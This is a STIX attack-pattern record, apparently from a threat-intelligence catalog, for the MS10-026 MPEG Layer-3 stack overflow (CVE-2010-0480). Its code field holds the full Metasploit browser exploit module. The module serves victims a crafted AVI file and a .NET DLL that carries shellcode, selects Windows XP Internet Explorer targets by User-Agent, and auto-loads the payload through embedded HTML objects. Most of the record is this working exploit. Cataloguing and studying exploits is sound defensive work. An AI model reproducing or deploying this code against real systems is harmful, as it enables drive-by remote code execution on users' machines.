{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--932569fd-9d5c-4de1-8ed6-61835c0636ab",
    "created": "2024-08-14T16:43:57.963097Z",
    "modified": "2024-08-14T16:43:57.963102Z",
    "name": "MS10-026 Microsoft MPEG Layer-3 Audio Stack Based Overflow",
    "description": " This module exploits a buffer overflow in l3codecx.ax while processing a AVI files with MPEG Layer-3 audio contents. The overflow only allows to overwrite with 0's so the three least significant bytes of EIP saved on stack are overwritten and shellcode is mapped using the .NET DLL memory technique pioneered by Alexander Sotirov and Mark Dowd. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms10_026_avi_nsamplespersec.rb",
            "external_id": "ms10_026_avi_nsamplespersec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0480"
        },
        {
            "source_name": "reference",
            "url": "https://www.exploit-db.com/moaub-5-microsoft-mpeg-layer-3-audio-stack-based-overflow/"
        },
        {
            "source_name": "reference",
            "url": "http://www.phreedom.org/research/bypassing-browser-memory-protections/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS10-026 Microsoft MPEG Layer-3 Audio Stack Based Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in l3codecx.ax while processing a\n        AVI files with MPEG Layer-3 audio contents. The overflow only allows to overwrite\n        with 0's so the three least significant bytes of EIP saved on stack are\n        overwritten and shellcode is mapped using the .NET DLL memory technique pioneered\n        by Alexander Sotirov and Mark Dowd.\n\n        Please note on IE 8 targets, your malicious URL must be a trusted site in order\n        to load the .Net control.\n      },\n      'Author'         =>\n        [\n          'Yamata Li', # Vulnerability Discovery\n          'Shahin Ramezany <shahin[at]abysssec.com>', # Vulnerability Analysis and Exploit\n          'juan vazquez', # Metasploit module\n          'Jordi Sanchez <jsanchez[at]0x01000000.org>', # Metasploit module - Help\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2010-0480'],\n          ['OSVDB', '63749'],\n          ['BID', '39303'],\n          ['MSB', 'MS10-026'],\n          ['URL', 'https://www.exploit-db.com/moaub-5-microsoft-mpeg-layer-3-audio-stack-based-overflow/'],\n          ['URL', 'http://www.phreedom.org/research/bypassing-browser-memory-protections/']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 4000\n        },\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          # Target 0: Automatic\n          # Tested with:\n          # Windows XP SP3 English IE 6\n          # Windows XP SP3 English IE 7\n          # Windows XP SP3 English IE 8: The exploiting site must be a trusted\n          # site to load the .NET control\n          # .NET CLR required\n          [\n            'Windows XP SP3 Automatic',\n            {\n              'Platform' => 'win',\n              'Ret' => 0x72000000\n            },\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-04-13'))\n  end\n\n  def exploit\n    # Embed our payload in a .Net binary\n    ibase = target.ret - 0x10000\n    shellcode = rand_text_alpha(target.ret - ibase - 0x2285)\n    shellcode << payload.encoded\n\n    #Use our own custom .Net binary, because we require a much bigger file\n    #to land our payload at the right place\n    opts = {\n      :template    => 'template_dotnetmem.dll',\n      :text_offset => 0x1285,\n      :text_max    => 0x20000,\n      :pack        => 'a131072',\n      :uuid_offset => 135816\n    }\n\n    @dotnet_payload = Msf::Util::EXE.to_dotnetmem(ibase, shellcode, opts)\n\n    # Load our AVI file\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2010-0480.avi\")\n    f = File.open(path, \"rb\")\n    @trigger = f.read(f.stat.size)\n    f.close\n\n    super\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request['User-Agent']\n    case request['User-Agent']\n      when /MSIE.*Windows NT 5\\.1.*\\.NET CLR .*/\n      when /Windows-Media-Player/\n        # AVI is requested by WMP\n      else\n        send_not_found(cli)\n        print_error(\"target not supported: #{agent}\")\n        return\n    end\n\n    if (request.uri =~ /\\.html/i)\n      avi_name = rand_text_alpha(4)\n      avi_trigger = \"\"\n\n      if (\"/\" == get_resource[-1,1])\n        avi_trigger = get_resource[0, get_resource.length - 1]\n      else\n        avi_trigger = get_resource\n      end\n\n      avi_trigger << \"/#{avi_name}.avi\"\n\n      html = %Q|<html>\n      <body>\n      <OBJECT ID=\"MediaPlayer\"\n      CLASSID=\"CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95\"\n      CODEBASE=\"http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#\n      Version=5,1,52,701\" STANDBY=\"Loading Microsoft Windows Media Player components...\"\n      TYPE=\"application/x-oleobject\" width=\"280\" height=\"46\">\n        <param name=\"fileName\" value=\"#{avi_trigger}\">\n        <param name=\"animationatStart\" value=\"true\">\n        <param name=\"transparentatStart\" value=\"true\">\n        <param name=\"autoStart\" value=\"true\">\n        <param name=\"showControls\" value=\"true\">\n        <param name=\"Volume\" value=\"-300\">\n      <embed type=\"application/x-mplayer2\"\n        pluginspage=\"http://www.microsoft.com/Windows/MediaPlayer/\"\n        src=\"#{avi_trigger}\"\n        name=\"MediaPlayer\"\n        width=280\n        height=46\n        autostart=1\n        showcontrols=1\n        volume=-300>\n      </embed>\n      </OBJECT>\n      </body>\n      </html>\n      |\n\n      html = html.gsub(/^ {6}/, '')\n\n      print_status(\"Sending trigger loader\")\n      send_response_html(cli, html)\n\n    elsif (request.uri =~ /\\.avi$/i)\n\n      print_status \"Sending AVI trigger\"\n      send_response(cli, @trigger, { 'Content-Type' => 'application/octet-stream' })\n      return\n\n    elsif (request.uri =~ /\\.dll$/i)\n\n      print_status \"Sending DLL file\"\n      send_response(\n        cli,\n        @dotnet_payload,\n        {\n          'Content-Type' => 'application/x-msdownload',\n          'Connection'   => 'close',\n          'Pragma'       => 'no-cache'\n        }\n      )\n      return\n\n    end\n\n    html_name = rand_text_alpha(4)\n    dll_uri = \"\"\n    html_trigger = \"\"\n\n    if (\"/\" == get_resource[-1,1])\n      dll_uri = get_resource[0, get_resource.length - 1]\n      html_trigger = get_resource[0, get_resource.length - 1]\n    else\n      dll_uri = get_resource\n      html_trigger = get_resource\n    end\n\n    dll_uri << \"/generic-\" + Time.now.to_i.to_s + \".dll\"\n    js_net_dll = \"<object classid=\\\"#{dll_uri}\\\"#GenericControl\\\"><object>\"\n    html_trigger << \"/#{html_name}.html\"\n\n    html  = %Q|<html>\n    <head>\n    <script language=\"javascript\">\n      function forward() {\n        window.location = window.location + '#{html_trigger}';\n      }\n\n      function start() {\n        setTimeout(\"forward()\", 2000);\n      }\n    </script>\n    </head>\n    <body onload=\"start()\">\n    <object classid=\"#{dll_uri}#GenericControl\">\n    <object>\n    </body>\n    </html>\n    |\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, html)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2010-04-13",
    "x_mitre_platforms": [
        "win'"
    ]
}